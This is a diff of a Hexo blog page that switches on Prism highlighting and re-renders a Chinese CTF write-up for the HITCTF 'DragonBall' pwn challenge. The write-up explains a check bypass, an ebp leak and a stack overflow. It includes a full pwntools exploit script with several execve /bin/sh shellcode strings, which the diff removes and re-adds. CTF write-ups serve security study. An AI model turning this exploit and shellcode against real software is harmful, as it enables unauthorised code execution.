@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="HITCTF DragonBall WP​    这段时间打算刷下之前哈工大的pwn。今天是第一天，本来打算搞两三道的结果发现一个栈就看了一天，哎果然还是太菜了。">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -318,9 +318,72 @@
         <h1 id="HITCTF-DragonBall-WP"><a href="#HITCTF-DragonBall-WP" class="headerlink" title="HITCTF DragonBall WP"></a>HITCTF DragonBall WP</h1><p>​    这段时间打算刷下之前哈工大的pwn。今天是第一天，本来打算搞两三道的结果发现一个栈就看了一天，哎果然还是太菜了。</p>
 <a id="more"></a>
 <p>​    拿到题目先checksc看发现什么保护都没有开，判断应该是栈，扔ida一审发现他没有check负数，check的逻辑是当钱为0时不能购买Dragonball，但是这里可以通过买-卖-再买使钱数不能被5整除，这样的话就能绕过check进入wish函数。wish函数中有两个输入，其中一个可以溢出，但是只能刚好溢出到ret，一开始觉得rop的话利用起来应该会比较烦，毕竟它能溢出的字节数还是比较少，而且他这里没有开nx，应该是通过写shellcode来getshell。这样想后便往写shellcode上去看，发现可以通过控制ebp来控制wish函数中写入的位置，由于wish函数中两次获取用户输入都是一个ebp，gdb跟了一下发现可以同时控制往bss段和got段写任意值（由于bss段足够大），于是打算复写puts的got为shellcode在bss段的起始地址，这样当wish函数中最后调用puts的时候就回去执行shellcode。完美。<br>​    emmmmm然而利用并没有成功。调了一下发现程序接收输入变成了从输出去接收，也就是read函数的fd变成了1，这样的话构造的字符串程序无法接收，但是这里第一次输入之后会输入目标空间中的值，也就是说这里我们可以得到程序的libc库。然后后来看了一下好像还是无法利用就先放弃了这个方法。<br>​    之后通过之前泄露libc库想到如果wish函数中第一次输入的时候将缓冲区填满，就能泄露ebp，一旦泄露ebp，栈上的所有地址都可以通过泄露的ebp+偏移得到，这时如果我们将shellcode布置在栈上，同时将ret复写为ebp-偏移，使ret指向栈上的那部分shellcode，我们就能getshell了。这里也有很多坑，主要就是程序输出的串没有接收导致进程阻塞之类的，还有就是最好不要去任意改变程序执行流程，这样可能会破坏栈结构，导致一些莫名其妙的问题，最后就是这里用shellcraft生成的shellcode好像不行，只好自己去网上找到能用的shellcode。<br>这道题应该还有其它的方法，等下次再填坑。</p>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386',os='linux')</span><br><span class="line">p=process('./DragonBall')</span><br><span class="line">elf=ELF('./DragonBall')</span><br><span class="line">gdb.attach(p,'''</span><br><span class="line">	break *0x080487C0</span><br><span class="line">	break *0x08048791</span><br><span class="line">	continue</span><br><span class="line">''')</span><br><span class="line"></span><br><span class="line">def buy():</span><br><span class="line">	p.recvuntil('You choice: ')</span><br><span class="line">	p.sendline('1')</span><br><span class="line"></span><br><span class="line">def sell():</span><br><span class="line">	p.recvuntil('You choice: ')</span><br><span class="line">	p.sendline('2')</span><br><span class="line"></span><br><span class="line">def list():</span><br><span class="line">	p.recvuntil('You choice: ')</span><br><span class="line">	p.sendline('3')</span><br><span class="line"></span><br><span class="line">#def wish():</span><br><span class="line">#	p.recvuntil('You choice: ')</span><br><span class="line">#	p.sendline('4')</span><br><span class="line">#	p.recvuntil('Tell me your wish: ')</span><br><span class="line">#	p.sendline('a'*0x68)</span><br><span class="line">#	p.recvuntil('a'*0x68)</span><br><span class="line">#	a=(u32(p.recv(4)))</span><br><span class="line">#	p.recvuntil('(Y/N) ')</span><br><span class="line">#	p.sendline(asm(shellcraft.sh())+(0x3c-len(asm(shellcraft.sh())))*'c'+p32(0x1234))</span><br><span class="line">#</span><br><span class="line">#def exit():</span><br><span class="line">#	p.recvuntil('You choice: ')</span><br><span class="line">#	p.sendline('5')</span><br><span class="line"></span><br><span class="line">buy()</span><br><span class="line">sell()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">buy()</span><br><span class="line">p.recvuntil('You choice: ')</span><br><span class="line">p.sendline('4')</span><br><span class="line">p.recvuntil('Tell me your wish: ')</span><br><span class="line">p.sendline('a'*0x67)</span><br><span class="line">p.recvuntil('a'*0x67)</span><br><span class="line">a=(u32(p.recv(4)))</span><br><span class="line">a='0xff'+(hex(a).replace('0x',''))[0:6]</span><br><span class="line">print a</span><br><span class="line">a=int(a,16)</span><br><span class="line">p.recvuntil('(Y/N) ')</span><br><span class="line">shellcode='<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>0<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>3<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>9<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xca</span></span><span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>58<span class="tag">\<span class="name">xcd</span></span><span class="tag">\<span class="name">x</span></span>80'</span><br><span class="line">shellcode='jhh///sh/bin<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>3h<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>814<span class="formula">$ri<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>011<span class="tag">\<span class="name">xc</span></span>9Qj<span class="tag">\<span class="name">x</span></span>04Y<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">xe</span></span>1Q<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>11<span class="tag">\<span class="name">xd</span></span>2j<span class="tag">\<span class="name">x</span></span>0bX<span class="tag">\<span class="name">xcd</span></span><span class="tag">\<span class="name">x</span></span>80'</span></span><br><span class="line"><span class="formula">shellcode='<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>0<span class="tag">\<span class="name">xb</span></span>0<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xd</span></span>2<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">xbb</span></span><span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">xc</span></span>1<span class="tag">\<span class="name">xeb</span></span><span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>53<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>7<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>0<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>57<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>6<span class="tag">\<span class="name">xb</span></span>0<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>05'</span></span><br><span class="line"><span class="formula">shellcode='<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>9<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xd</span></span>2<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>3<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xc</span></span>0<span class="tag">\<span class="name">xb</span></span>0<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">xcd</span></span><span class="tag">\<span class="name">x</span></span>80'</span></span><br><span class="line"><span class="formula">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line"><span class="formula">leng=len(shellcode)</span></span><br><span class="line"><span class="formula">#p.sendline((shellcode)+(0x3c-len((shellcode)))*'c'+p32(0x1234))</span></span><br><span class="line"><span class="formula">p.sendline(shellcode+'a'*(0x3c-leng)+p32(a-0x58))</span></span><br><span class="line"><span class="formula"></span></span><br><span class="line"><span class="formula">p.interactive()</span></span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;)
+p=process(&#39;./DragonBall&#39;)
+elf=ELF(&#39;./DragonBall&#39;)
+gdb.attach(p,&#39;&#39;&#39;
+    break *0x080487C0
+    break *0x08048791
+    continue
+&#39;&#39;&#39;)
 
+def buy():
+    p.recvuntil(&#39;You choice: &#39;)
+    p.sendline(&#39;1&#39;)
 
+def sell():
+    p.recvuntil(&#39;You choice: &#39;)
+    p.sendline(&#39;2&#39;)
+
+def list():
+    p.recvuntil(&#39;You choice: &#39;)
+    p.sendline(&#39;3&#39;)
+
+#def wish():
+#    p.recvuntil(&#39;You choice: &#39;)
+#    p.sendline(&#39;4&#39;)
+#    p.recvuntil(&#39;Tell me your wish: &#39;)
+#    p.sendline(&#39;a&#39;*0x68)
+#    p.recvuntil(&#39;a&#39;*0x68)
+#    a=(u32(p.recv(4)))
+#    p.recvuntil(&#39;(Y/N) &#39;)
+#    p.sendline(asm(shellcraft.sh())+(0x3c-len(asm(shellcraft.sh())))*&#39;c&#39;+p32(0x1234))
+#
+#def exit():
+#    p.recvuntil(&#39;You choice: &#39;)
+#    p.sendline(&#39;5&#39;)
+
+buy()
+sell()
+buy()
+buy()
+buy()
+buy()
+buy()
+buy()
+buy()
+p.recvuntil(&#39;You choice: &#39;)
+p.sendline(&#39;4&#39;)
+p.recvuntil(&#39;Tell me your wish: &#39;)
+p.sendline(&#39;a&#39;*0x67)
+p.recvuntil(&#39;a&#39;*0x67)
+a=(u32(p.recv(4)))
+a=&#39;0xff&#39;+(hex(a).replace(&#39;0x&#39;,&#39;&#39;))[0:6]
+print a
+a=int(a,16)
+p.recvuntil(&#39;(Y/N) &#39;)
+shellcode=&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&#39;
+shellcode=&#39;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#39;
+shellcode=&#39;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#39;
+shellcode=&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
+#shellcode=asm(shellcraft.sh())
+leng=len(shellcode)
+#p.sendline((shellcode)+(0x3c-len((shellcode)))*&#39;c&#39;+p32(0x1234))
+p.sendline(shellcode+&#39;a&#39;*(0x3c-leng)+p32(a-0x58))
+
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -425,6 +488,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
